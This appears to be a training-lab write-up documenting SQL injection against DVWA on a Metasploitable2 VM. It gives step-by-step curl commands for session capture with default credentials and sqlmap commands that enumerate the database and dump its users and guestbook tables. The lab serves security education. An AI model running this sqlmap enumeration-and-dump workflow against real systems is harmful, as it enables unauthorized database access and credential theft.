# Hack DVWA Database using sqlmap tool   

---

## 📌 Overview  
This project documents an **authorized SQL Injection exploitation lab** performed on **DVWA (Damn Vulnerable Web Application)** hosted on **Metasploitable2**, using **sqlmap** from a Kali Linux attacker machine.  
  
The objective was to identify a SQL injection point, enumerate the backend MySQL database, list schema objects (DBs, tables, columns), and safely extract sample records — all within a **controlled, isolated environment** as part of the TISA cyber-security training.

---

## 📘 Abstract  
In this authorized lab exercise, a DVWA instance on Metasploitable2 was assessed using Kali Linux to verify and document a SQL injection vulnerability.  

The process involved:

- Capturing **baseline evidence** (HTTP headers, cookies)  
- Logging into DVWA using default credentials  
- Setting security level to **low**  
- Using **sqlmap** to detect an injectable `id` parameter  
- Enumerating the backend **MySQL** databases  
- Listing tables (`users`, `guestbook`) and their column structures  
- Performing **controlled, read-only dumps** of sample records  
- Saving logs and outputs to an evidence directory  
- Cross-validating results with manual captures  
- Providing remediation recommendations

All activities were executed **only inside a safe and isolated lab**, with explicit authorization.

---

## 🔑 Key Terms  
- **Kali Linux:** Debian-based OS for penetration testing  
- **Metasploitable2:** Intentionally vulnerable VM for training  
- **DVWA:** Vulnerable PHP/MySQL application designed for learning web exploitation  
- **sqlmap:** Automated SQL injection exploitation tool  
- **SQL Injection:** Injection flaw that manipulates SQL queries  
- **PHPSESSID:** Session cookie used by DVWA for authentication

---

## 🧪 Lab Setup  
| Component | Description |
|----------|-------------|
| Attacker Machine | Kali Linux |
| Target Machine | Metasploitable2 |
| Application | DVWA (PHP/Mysql) |
| Tools Used | curl, sqlmap |

---

## 📂 Evidence Directory  
All evidence was saved in:  
~/dvwa_evidence/run1/


Contents included:
- HTTP headers  
- Cookies  
- Security page dumps  
- sqlmap output logs  
- Sample extracted CSVs  

---

## 📝 Step-by-Step Procedure  
------------------------------------------------------------------------------------------------
### **1. Create evidence folder & capture root page headers**


mkdir -p ~/dvwa_evidence/run1 &&
curl -I http://<DVWA-IP>/dvwa/ -sS -D - \

~/dvwa_evidence/run1/headers_root_$(date +%Y%m%d_%H%M%S).txt
------------------------------------------------------------------------------------------------

### **2. Capture login page headers**


curl -I http://<DVWA-IP>/dvwa/login.php -sS -D - \

~/dvwa_evidence/run1/headers_login_$(date +%Y%m%d_%H%M%S).txt
------------------------------------------------------------------------------------------------

### **3. Capture security page headers**


curl -I http://<DVWA-IP>/dvwa/security.php -sS -D - \

~/dvwa_evidence/run1/headers_security_$(date +%Y%m%d_%H%M%S).txt
------------------------------------------------------------------------------------------------

### **4. Login and save cookie**


curl -i -s -c ~/dvwa_evidence/run1/cookies_dvwa.txt
-d "username=admin&password=password&Login=Login"
-X POST "http://<DVWA-IP>/dvwa/login.php"
------------------------------------------------------------------------------------------------

### **5. Access security page using saved session**


curl -b ~/dvwa_evidence/run1/cookies_dvwa.txt -s -D -
"http://<DVWA-IP>/dvwa/security.php" \

~/dvwa_evidence/run1/security_page_$(date +%Y%m%d_%H%M%S).html
------------------------------------------------------------------------------------------------

### **6. Access SQLi page with sample ID**


curl -b ~/dvwa_evidence/run1/cookies_dvwa.txt -s
"http://<DVWA-IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
-o ~/dvwa_evidence/run1/page_id1_$(date +%Y%m%d_%H%M%S).html
------------------------------------------------------------------------------------------------

### **7. Extract PHP session**


grep PHPSESSID ~/dvwa_evidence/run1/cookies_dvwa.txt


------------------------------------------------------------------------------------------------

## 🔍 SQL Injection Exploitation

### **8. Enumerate databases**


sqlmap -u "http://<DVWA-IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
--cookie="security=low; PHPSESSID=<session>"
--batch --level=3 --risk=2 --threads=1 --random-agent --dbs
--output-dir=~/dvwa_evidence/run1/sqlmap_enum
------------------------------------------------------------------------------------------------

### **9. List tables in dvwa database**


sqlmap ... -D dvwa --tables ...
------------------------------------------------------------------------------------------------

### **10. List columns in `users` table**


sqlmap ... -D dvwa -T users --columns ...
------------------------------------------------------------------------------------------------

### **11. List columns in `guestbook` table**


sqlmap ... -D dvwa -T guestbook --columns ...
------------------------------------------------------------------------------------------------

### **12. Dump `users` table**


sqlmap ... -D dvwa -T users --dump ...
------------------------------------------------------------------------------------------------

### **13. Dump `guestbook` table**


sqlmap ... -D dvwa -T guestbook --dump ...


------------------------------------------------------------------------------------------------

## ✔ Findings  
- The `id` parameter on the DVWA SQLi page was confirmed **injectable**.  
- `sqlmap` successfully enumerated databases and tables.  
- Backend DBMS: **MySQL**  
- Key tables extracted:
  - `users`
  - `guestbook`  
- Extracted data was saved to the evidence folder (not uploaded publicly).  

------------------------------------------------------------------------------------------------
